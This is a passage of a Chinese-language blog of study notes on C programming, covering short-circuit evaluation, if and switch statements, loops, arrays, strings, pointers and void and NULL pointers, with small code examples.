<li><font color="red">注：关系表达式和逻辑表达式得到的值都是一个逻辑值，也就是表示真的 1 和表示假的 0。但是用于判断一个值是否为真时，以 0 表示假，以任何非 0 的数表示真。一个是编译系统告诉我们的结果，一个是我们让编译系统去判断的，两者方向不同。</font></li>
</ul>
<h4 id="4-运算符的优先级和结合性："><a href="#4-运算符的优先级和结合性：" class="headerlink" title="4.运算符的优先级和结合性："></a>4.运算符的优先级和结合性：</h4><p><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538459732544&di=5b4838d7669173551b05c2fbfd33eab3&imgtype=0&src=http%3A%2F%2Fd.hiphotos.baidu.com%2Fzhidao%2Fpic%2Fitem%2Fb8389b504fc2d562b63ab678e71190ef76c66c70.jpg" alt></p>
<h4 id="5-短路求值"><a href="#5-短路求值" class="headerlink" title="5.短路求值"></a>5.短路求值</h4><ul>
<li><p>短路求值又称最小化求值，是一种逻辑运算符的求值策略。只有当第一个运算数的值无法确定逻辑运算的结果时，才对第二个运算数进行求值。</p>
</li>
<li><p>C 语言对于逻辑与和逻辑或采用短路求值的方式。</p>
</li>
</ul>
<ul>
<li>例如：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
</code></pre>
</li>
</ul>
<p>int main()<br>{<br>        int a = 3, b = 3;</p>
<pre><code>    (a = 0) &amp;&amp; (b = 5);
    printf(&quot;a = %d, b = %d\n&quot;, a, b);

    (a = 1) || (b = 5);
    printf(&quot;a = %d, b = %d\n&quot;, a, b);

    return 0;</code></pre><p>}</p>
<pre><code>结果为：![](https://fishc.com.cn/forum.php?mod=image&amp;aid=41970&amp;size=400x300&amp;key=3d6e6c06c1d0cd8f&amp;type=1)

***
***

## **if语句**
### 语句1
```c
if(表达式){
    ...   //逻辑值为真所执行的语句或程序块
}</code></pre><hr>
<h3 id="语句2"><a href="#语句2" class="headerlink" title="语句2"></a>语句2</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">1</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span></code></pre>
<hr>
<hr>
<h2 id="switch语句与分支嵌套"><a href="#switch语句与分支嵌套" class="headerlink" title="switch语句与分支嵌套"></a><strong>switch语句与分支嵌套</strong></h2><h3 id="1-switch语句"><a href="#1-switch语句" class="headerlink" title="1.switch语句"></a>1.switch语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">switch</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">case</span> 常量表达式<span class="token number">1</span><span class="token punctuation">:</span> 语句或程序块
    <span class="token keyword">case</span> 常量表达式<span class="token number">2</span><span class="token punctuation">:</span> 语句或程序块
    ……
    <span class="token keyword">case</span> 常量表达式n：语句或程序块
    <span class="token keyword">default</span><span class="token punctuation">:</span> 语句或程序块 
<span class="token punctuation">}</span></code></pre>
<ul>
<li>这里每个 case 后边的常量是匹配 switch 后边表达式的值</li>
<li>case 后边必须跟一个常量值，而不能是一个范围</li>
<li>如果所有的 case 均没有匹配的，那么执行 default 的内容</li>
<li>default 是可选的，如果没有 default，并且所有的 case 均不匹配，那么 switch 语句不执行任何动作</li>
</ul>
<hr>
<h3 id="2-使用-break-语句跳出"><a href="#2-使用-break-语句跳出" class="headerlink" title="2. 使用 break 语句跳出"></a>2. 使用 break 语句跳出</h3><ul>
<li>switch 语句中的 case 和 default 事实上都是“标签”，用来标志一个位置而已。</li>
<li>当 switch 跳到某个位置之后，就会一直往下执行，所以我们这里还需要配合一个 break 语句，让代码在适当的位置跳出 switch。</li>
</ul>
<hr>
<h3 id="3-分支结构的嵌套"><a href="#3-分支结构的嵌套" class="headerlink" title="3. 分支结构的嵌套"></a>3. 分支结构的嵌套</h3><ul>
<li>如果在一个 if 语句中包含另一个 if 语句，我们就称之为 if 语句的嵌套，也叫分支结构的嵌套。<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=42523&size=400x300&key=0c6b31924edebe20&type=1" alt></li>
</ul>
<hr>
<h3 id="4-else悬挂"><a href="#4-else悬挂" class="headerlink" title="4.else悬挂"></a>4.else悬挂</h3><ul>
<li>C 语言中有这样的规则，else 始终与同一对括号内最近的未匹配的 if 结合。</li>
</ul>
<hr>
<h3 id="5-等于号带来的问题"><a href="#5-等于号带来的问题" class="headerlink" title="5. 等于号带来的问题"></a>5. 等于号带来的问题</h3><ul>
<li><p>在 C 语言中使用等号（=）作为赋值运算，使用连续两个等号（==）作为比较运算。一般而言，赋值运算相对于比较运算出现得更频繁，因此字符较少的 = 就被赋予了更常用的含义——赋值操作。</p>
</li>
<li><p>此外，在 C 语言中赋值符号被作为一种操作符对待，因而重复进行赋值操作（如 a = b = c）可以很容易地书写，并且赋值操作还可以被嵌入到更大的表达式中。</p>
</li>
<li><p>但是，这种使用上的便利性可能导致一个潜在的问题：当程序员本意是在作比较运算时，却可能无意中误写成赋值运算</p>
</li>
</ul>
<hr>
<hr>
<h2 id="while语句与do-while语句"><a href="#while语句与do-while语句" class="headerlink" title="while语句与do while语句"></a><strong>while语句与do while语句</strong></h2><h3 id="1-循环结构"><a href="#1-循环结构" class="headerlink" title="1.循环结构"></a>1.循环结构</h3><ul>
<li>当我们需要重复执行同一段代码很多次的时候，就可以使用循环结构来解决。</li>
</ul>
<hr>
<h3 id="2-while语句"><a href="#2-while语句" class="headerlink" title="2.while语句"></a>2.while语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>
    循环体</code></pre>
<ul>
<li>while 语句的语法非常简单，只要表达式的值为真，那么就会不断执行循环体里边的语句或程序块。<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=42690&size=400x300&key=25005d39fc536b73&type=1" alt></li>
</ul>
<hr>
<h3 id="3-do-while-语句"><a href="#3-do-while-语句" class="headerlink" title="3.do while 语句"></a>3.do while 语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">do</span>
    循环体
<span class="token keyword">while</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><p>while 是先判断表达式，如果表达式结果为真，才执行循环体里边的内容；</p>
</li>
<li><p>而 do…while 则相反，先执行循环体的内容再判断表达式是否为真。</p>
</li>
</ul>
<p><img src="https://fishc.com.cn/forum.php?mod=image&aid=42691&size=400x300&key=de54871239f4aafb&type=1" alt></p>
<ul>
<li><font color="red">注意：do…while 语句在 while 后边一定要用分号（;）表示语句结束。</font></li>
</ul>
<hr>
<hr>
<h2 id="for语句与循环嵌套"><a href="#for语句与循环嵌套" class="headerlink" title="for语句与循环嵌套"></a><strong>for语句与循环嵌套</strong></h2><h3 id="1-循环三要点"><a href="#1-循环三要点" class="headerlink" title="1.循环三要点"></a>1.循环三要点</h3><ul>
<li>初始化计数器</li>
<li>判断循环条件是否满足</li>
<li>更新计数器</li>
</ul>
<hr>
<h3 id="2-for语句"><a href="#2-for语句" class="headerlink" title="2.for语句"></a>2.for语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>表达式<span class="token number">1</span><span class="token punctuation">;</span> 表达式<span class="token number">2</span><span class="token punctuation">;</span> 表达式<span class="token number">3</span><span class="token punctuation">)</span>
        循环体</code></pre>
<ul>
<li>三个表达式用分号隔开，其中：</li>
</ul>
<blockquote>
<p>表达式1是循环初始化表达式</p>
</blockquote>
<blockquote>
<p>表达式2是循环条件表达式</p>
</blockquote>
<blockquote>
<p>表达式3是循环调整表达式</p>
</blockquote>
<ul>
<li>特点：</li>
</ul>
<p>for 语句的表达式1，表达式2和表达式3都可以按照需要进行省略（但分号不能省）：</p>
<blockquote>
<p>for ( ; 表达式2; 表达式3)</p>
</blockquote>
<blockquote>
<p>for (表达式1; 表达式2; )</p>
</blockquote>
<blockquote>
<p>for (表达式1; ; )</p>
</blockquote>
<blockquote>
<p>for ( ; ; )</p>
</blockquote>
<blockquote>
<p>……</p>
</blockquote>
<ul>
<li><font color="red">注意：如果目的不是特别明确，建议不要这么做，因为程序的可读性会因此而降低！</font></li>
</ul>
<hr>
<h3 id="3-循环嵌套"><a href="#3-循环嵌套" class="headerlink" title="3. 循环嵌套"></a>3. 循环嵌套</h3><ul>
<li><p>循环结构跟分支结构一样，都可以实现嵌套。</p>
</li>
<li><p>对于嵌套的循环结构，执行顺序是从内到外：先执行内层循环，再执行外层循环。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="break语句和continue语句"><a href="#break语句和continue语句" class="headerlink" title="break语句和continue语句"></a><strong>break语句和continue语句</strong></h2><h3 id="1-break-语句"><a href="#1-break-语句" class="headerlink" title="1.break 语句"></a>1.break 语句</h3><ul>
<li><p>在循环体中，如果我们想要让程序在中途跳出循环，那么我们同样可以使用 break 语句来实现。</p>
</li>
<li><p>执行 break 语句，直接跳出循环体。</p>
</li>
<li><p><font color="red">对于嵌套循环来说，break 语句只负责跳出所在的那一层循环，要跳出外层循环则需要再布置一个 break 语句才行。</font></p>
</li>
</ul>
<hr>
<h3 id="2-continue语句"><a href="#2-continue语句" class="headerlink" title="2.continue语句"></a>2.continue语句</h3><ul>
<li><p>当满足某个条件的时候，跳过本轮循环的内容，直接开始下一轮循环。这时候我们应该使用 continue 语句。</p>
</li>
<li><p>当执行到 continue 语句的时候，循环体的剩余部分将被忽略，直接进入下一轮循环。</p>
</li>
<li><p>对于嵌套循环来说，continue 语句跟 break 语句是一样的：它们都只能作用于一层循环体。</p>
</li>
</ul>
<hr>
<h3 id="3-for-语句和-while-语句执行过程的区别"><a href="#3-for-语句和-while-语句执行过程的区别" class="headerlink" title="3. for 语句和 while 语句执行过程的区别"></a>3. for 语句和 while 语句执行过程的区别</h3><ul>
<li><p>for 语句和 while语句执行过程是有区别的，它们的区别在于出现 continue 语句时。</p>
</li>
<li><p>在 for 语句中，continue语句跳过循环的剩余部分，直接回到调整部分。</p>
</li>
<li><p>在 while 语句中，调整部分是循环体的一部分，因此 continue 语句会把它也跳过。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a><strong>数组</strong></h2><h3 id="1-数组的含义"><a href="#1-数组的含义" class="headerlink" title="1.数组的含义"></a>1.数组的含义</h3><ul>
<li>数组是储存同类型数据的地方</li>
</ul>
<h3 id="2-定义数组"><a href="#2-定义数组" class="headerlink" title="2.定义数组"></a>2.定义数组</h3><ul>
<li>类型 数组名[常量表达式] 例如：<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">double</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
</ul>
<h3 id="3-访问"><a href="#3-访问" class="headerlink" title="3.访问"></a>3.访问</h3><ul>
<li><p>数组名[下标]</p>
<pre class=" language-c"><code class="language-c">a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p><font color="red">第一个元素的下标是0而不是1</font></p>
</li>
</ul>
<h3 id="4-数组的初始化"><a href="#4-数组的初始化" class="headerlink" title="4.数组的初始化"></a>4.数组的初始化</h3><ul>
<li><p>在定义数组的同时对其各个元素进行赋值，称之为数组的初始化</p>
</li>
<li><p>第一种：将所有元素统一初始化为某个值</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第二种：赋不同值，用逗号隔开</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第三种：只给一部分赋值，其余自动初始化为0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 表示为前边 6 个元素赋值，后边 4 个元素系统自动初始化为 0</span></code></pre>
</li>
<li><p>第四种：可以只给出各个元素的值，而不指定数组的长度</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第五种：C99 增加了一种新特性——指定初始化的元素。这样就可以只对数组中的某些指定元素进行初始化赋值，而未被赋值的元素自动初始化为 0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 编译的时候记得加上–std=c99选项</span></code></pre>
</li>
</ul>
<hr>
<hr>
<h2 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a><strong>字符串处理函数</strong></h2><h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><ul>
<li>两种方式存放和表达字符串：1.字符串常量2.字符类型的数组</li>
<li>字符数组</li>
</ul>
<blockquote>
<p>可以先定义指定长度的字符数组，然后再给每个元素单独赋值：</p>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> main
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'e'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'s'</span><span class="token punctuation">;</span>
    str<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>

    ……
<span class="token punctuation">}</span></code></pre>
<blockquote>
<p>还可以直接在定义的时候对字符数组进行初始化，这样会方便很多：</p>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> main
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// 初始化字符数组的每个元素</span>
    <span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 可以不写元素的个数，因为编译器会自动计算</span>
    <span class="token keyword">char</span> str3<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 使用字符串常量初始化字符数组</span>
    <span class="token keyword">char</span> str4<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Nines"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// 使用字符串常量初始化，可以省略大括号</span>
    <span class="token keyword">char</span> str5<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Nines"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<hr>
<h3 id="字符串处理函数-1"><a href="#字符串处理函数-1" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><ul>
<li>获取字符串的长度：strlen 函数</li>
</ul>
<p>拷贝字符串：strcpy 函数和 strncpy 函数</p>
<p>连接字符串：strcat 函数和 strncat 函数</p>
<p>比较字符串：strcmp 函数和 strncmp 函数</p>
<hr>
<hr>
<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a><strong>二维数组</strong></h2><h3 id="1-二维数组的定义"><a href="#1-二维数组的定义" class="headerlink" title="1.二维数组的定义"></a>1.二维数组的定义</h3><ul>
<li>定义二维数组的方法跟一维数组相似，使用方括号指定每个维度的元素个数：</li>
</ul>
<blockquote>
<p>类型 数组名[常量表达式][常量表达式]</p>
</blockquote>
<blockquote>
<p><font color="red">注意</font>：这里需要强调的是几行几列我们是从概念模型上来看的，也就是说，这样来看待二维数组，我们可以更容易理解。但从物理模型上看，无论是二维数组还是更多维的数组，在内存中仍然是以线性的方式存储的。</p>
</blockquote>
<h3 id="2-二维数组的访问"><a href="#2-二维数组的访问" class="headerlink" title="2.二维数组的访问"></a>2.二维数组的访问</h3><ul>
<li>数组名[下标]:<pre class=" language-c"><code class="language-c">a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问a数组中第1行第1列的元素</span>
b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 访问b数组中第2行第4列的元素</span></code></pre>
</li>
<li><font color="red">要防止数组越界</font></li>
</ul>
<h3 id="3-二维数组的初始化"><a href="#3-二维数组的初始化" class="headerlink" title="3.二维数组的初始化"></a>3.二维数组的初始化</h3><ul>
<li><p>由于二维数组在内存中是线性存放的，因此可以将数据写在一个花括号内</p>
</li>
<li><p>为了更直观地表示元素的分布，可以用大括号将每一行的元素括起来</p>
</li>
<li><p>二维数组也可以仅对部分元素赋初值</p>
</li>
<li><p>C99 同样增加了一种新特性：指定初始化的元素。这样就可以只对数组中的某些指定元素进行初始化赋值，而未被赋值的元素自动初始化为 0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>二维数组也可以让编译器根据元素的数量计算数组的长度。但只有第 1 维的元素个数可以不写，其他维度必须写上</p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a><strong>指针</strong></h2><h3 id="1-内存存放变量"><a href="#1-内存存放变量" class="headerlink" title="1.内存存放变量"></a>1.内存存放变量</h3><ul>
<li>通过变量名对变量进行访问和存储是为了方便程序员而设计的，其实在内存中完全没有存储变量名的必要。因为编译器知道具体每一个变量名对应的存放地址，所以当你读取某个变量的时候，编译器就会找到变量名所在的地址，并根据变量的类型读取相应范围的数据。</li>
</ul>
<h3 id="2-指针和指针变量"><a href="#2-指针和指针变量" class="headerlink" title="2.指针和指针变量"></a>2.指针和指针变量</h3><ul>
<li>通常我们所说的指针，就是地址的意思。C 语言中有专门的指针变量用于存放指针，跟普通变量不同，指针变量存储的是一个地址。</li>
<li>指针变量也有类型，它的类型就是存放的地址指向的数据类型。</li>
</ul>
<h3 id="3-定义指针变量"><a href="#3-定义指针变量" class="headerlink" title="3.定义指针变量"></a>3.定义指针变量</h3><ul>
<li>定义指针变量跟普通变量十分相似，只是中间多了一个星号（*）<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span></code></pre>
</li>
<li>左侧的数据类型表示指针变量中存放的地址指向的内存单元的数据类型</li>
</ul>
<h3 id="4-取地址运算符和取值运算符"><a href="#4-取地址运算符和取值运算符" class="headerlink" title="4.取地址运算符和取值运算符"></a>4.取地址运算符和取值运算符</h3><ul>
<li><p>如果需要获取某个变量的地址，可以使用取地址运算符（&amp;）</p>
</li>
<li><p>如果需要访问指针变量指向的数据，可以使用取值运算符（*）</p>
</li>
<li><p><font color="red">注意</font>：取值运算符跟定义指针用的都是星号（*），这属于符号的重用，在不同的地方有不同的意义：在定义时表示定义一个指针变量；在其他位置表示获取指针变量指向的变量的值</p>
</li>
<li><p><font color="red"><strong>避免访问未初始化指针</strong></font> </p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针和数组"><a href="#指针和数组" class="headerlink" title="指针和数组"></a><strong>指针和数组</strong></h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><ul>
<li>数组不是指针</li>
<li>数组名是数组第一个元素的地址，也是数组的首地址<h3 id="2-指向数组的指针："><a href="#2-指向数组的指针：" class="headerlink" title="2.指向数组的指针："></a>2.指向数组的指针：</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>
p <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 语句1</span>
p <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 语句2</span></code></pre>
<blockquote>
<p>因为数组名即数组第一个元素的地址，所以语句 1 和语句 2 是等价的，都是将数组 a 的首地址存放到指针变量 p 中。</p>
</blockquote>
</li>
</ul>
<h3 id="3-指针的运算"><a href="#3-指针的运算" class="headerlink" title="3.  指针的运算"></a>3.  指针的运算</h3><ul>
<li><p>当指针指向数组元素的时候，我们可以对指针变量进行加减运算，这样做的意义相当于指向距离指针所在位置向前或向后第 n 个元素。比如 p+1 表示指向 p 指针指向的元素的下一个元素；p-1 则表示指向上一个元素。</p>
</li>
<li><p><font color="red">注意</font>：p+1 并不是简单地将地址加1，而是指向数组的下一个元素</p>
</li>
</ul>
<hr>
<hr>
<h2 id="指针数组和数组指针"><a href="#指针数组和数组指针" class="headerlink" title="指针数组和数组指针"></a><strong>指针数组和数组指针</strong></h2><h3 id="1-指针和数组的区别"><a href="#1-指针和数组的区别" class="headerlink" title="1. 指针和数组的区别"></a>1. 指针和数组的区别</h3><ul>
<li>指针是左值</li>
<li>而数组名只是一个地址常量，它不可以被修改，所以数组名不是左值。</li>
</ul>
<h3 id="2-指针数组"><a href="#2-指针数组" class="headerlink" title="2. 指针数组"></a>2. 指针数组</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>p1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><font color="blue">指针数组是一个数组，每个数组元素存放一个指针变量。</font></li>
</ul>
<h3 id="3-数组指针"><a href="#3-数组指针" class="headerlink" title="3.数组指针"></a>3.数组指针</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>p2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><font color="blue">数组指针是一个指针，它指向的是一个数组。</font></li>
</ul>
<hr>
<hr>
<h2 id="指针和二维数组"><a href="#指针和二维数组" class="headerlink" title="指针和二维数组"></a><strong>指针和二维数组</strong></h2><ul>
<li><p>在 C 语言中，二维数组的实现，只是简单地通过“线性扩展”的方式进行。</p>
</li>
<li><p>要用指针来指向二维数组，需要使用数组指针的形式。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="void指针和NULL指针"><a href="#void指针和NULL指针" class="headerlink" title="void指针和NULL指针"></a><strong>void指针和NULL指针</strong></h2><h3 id="1-void类型"><a href="#1-void类型" class="headerlink" title="1.void类型"></a>1.void类型</h3><ul>
<li>void 即的字面意思是“无类型”，定义变量的时候，我们通过类型来决定该变量所占的内存空间。</li>
</ul>
<h3 id="2-void指针"><a href="#2-void指针" class="headerlink" title="2.void指针"></a>2.void指针</h3><ul>
<li>void 指针我们把它称之为通用指针，就是可以指向任意类型的数据。也就是说，任何类型的指针都可以赋值给 void 指针。</li>
</ul>
<blockquote>
<p>不要直接对 void 指针进行解引用，因为编译器不知道它所指向的数据类型</p>
</blockquote>
<blockquote>
<p>使用 void 指针一定要小心，由于 void 指针可以包罗万象的特性，间接使得不同类型的指针转换变为合法</p>
</blockquote>
<h3 id="3-NULL指针"><a href="#3-NULL指针" class="headerlink" title="3.NULL指针"></a>3.NULL指针</h3><ul>
